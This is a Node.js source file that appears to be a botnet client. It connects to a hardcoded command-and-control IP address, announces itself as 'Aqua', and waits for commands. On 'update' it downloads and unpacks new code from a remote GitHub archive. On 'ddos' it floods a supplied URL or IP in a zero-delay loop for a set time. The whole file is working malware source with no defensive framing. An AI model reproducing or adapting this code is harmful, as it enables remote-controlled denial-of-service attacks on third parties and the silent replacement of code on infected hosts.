module.exports.run = (async function (){
    const rawHttp = require('./Scripts/rawHttp')
    var net = require('net');
    var client = new net.Socket();
    const mainServer = require('./index')
    const ServerName = "Aqua";
    const request = require('request')
    const fs = require('fs')
    const unzipper = require('unzipper')

    
    process.on('uncaughtException', function (err) {
        console.log('Caught exception: ' + err);
      });

    function sleep(ms) {
        return new Promise((resolve) => {
          setTimeout(resolve, ms);
        });
      }   
    


    try {
        client.setKeepAlive(true, 500);
        client.connect(4372, '82.131.114.232', function() {
            console.log('Connected to the Server');
            client.write(ServerName);
        });

        
        client.on('data', async function(data) {
            data = data.toString();
            if(data.split('|')[0] === undefined) return;
            data = data.split('|');
            let option = data[0];
            if(option === "update")
            {
                console.log("updating")
                await request("https://codeload.github.com/tewni-svg/Client/zip/main").pipe(fs.createWriteStream('../main.zip'))
                await sleep(10000);
                await fs.createReadStream('../main.zip')
                .pipe(unzipper.Extract({ path: '../' }));
                await sleep(10000);
                process.exit(1);
            }
            if(option === "ddos")
            {
                let URL_IP = data[1];
                let Time = data[2];
                let Type = data[3];
                if(Type === "rawHttp")
                {
                    let running = true;
                    setTimeout(() => {
                        running = false;
                    }, Time);
                    var interval = setInterval(() => {
                        if(!running) clearInterval(interval)
                        rawHttp.start(URL_IP)
                    }, 0);
                }
            }
        });

        client.on('error', function(data) {
            mainServer.run();
        });
    }
    catch{

    }



})